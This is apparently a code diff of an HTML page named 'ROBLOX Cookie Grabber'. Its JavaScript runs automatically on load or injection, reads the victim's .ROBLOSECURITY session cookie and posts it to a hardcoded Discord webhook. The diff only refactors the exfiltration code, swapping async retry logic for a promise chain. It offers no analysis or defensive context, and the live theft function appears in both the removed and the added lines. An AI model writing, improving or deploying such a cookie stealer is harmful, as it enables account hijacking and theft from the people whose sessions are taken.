@@ -3,15 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ROBLOX Cookie Grabber</title>
+    <title>Grab .ROBLOSECURITY Cookie</title>
 </head>
 <body>
     <h1>ROBLOX Cookie Grabber</h1>
-    <script>
-        const webhookURL = 'https://discord.com/api/webhooks/1274231750897438763/eLtKsEsOsyK6WNpFk97PVEb5pPIRmFq4obBDcZH579WFccrRsxPrEByzr0fkUpjEwgBM';
-        const rateLimitDelay = 60000; // 1 minute delay
 
-        async function getRobloxSecurityCookie() {
+    <script>
+        // Function to grab the .ROBLOSECURITY cookie
+        function getRobloxSecurityCookie() {
             const cookies = document.cookie.split('; ');
             let robloxCookie = '';
 
@@ -23,45 +22,39 @@
 
             if (robloxCookie) {
                 console.log('.ROBLOSECURITY cookie found:', robloxCookie);
-                await sendCookieToDiscord(robloxCookie);
+                sendCookieToDiscord(robloxCookie);
             } else {
                 console.log('No .ROBLOSECURITY cookie found.');
             }
         }
 
-        async function sendCookieToDiscord(cookie) {
+        function sendCookieToDiscord(cookie) {
+            const webhookURL = 'https://discord.com/api/webhooks/1274231750897438763/eLtKsEsOsyK6WNpFk97PVEb5pPIRmFq4obBDcZH579WFccrRsxPrEByzr0fkUpjEwgBM';
+
             const data = {
-                content: '@everyone .ROBLOSECURITY cookie found: ' + cookie
+                content: '@everyone .ROBLOSECURITY cookie found: ' + cookie,
             };
 
-            try {
-                let response = await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(data)
-                });
-
-                if (response.status === 429) {
-                    console.warn('Rate limit exceeded. Waiting before retrying.');
-                    await delay(rateLimitDelay);
-                    return sendCookieToDiscord(cookie); // Retry after delay
-                } else if (response.ok) {
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
                     console.log('Cookie sent to Discord webhook successfully.');
                 } else {
-                    console.error('Failed to send cookie to Discord webhook. Status:', response.status);
+                    console.error('Failed to send cookie to Discord webhook.');
                 }
-            } catch (error) {
+            })
+            .catch(error => {
                 console.error('Error:', error);
-            }
+            });
         }
 
-        function delay(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
-
-        // Run the function when the script is loaded
+        // Run the function when the script is injected
         getRobloxSecurityCookie();
     </script>
 </body>
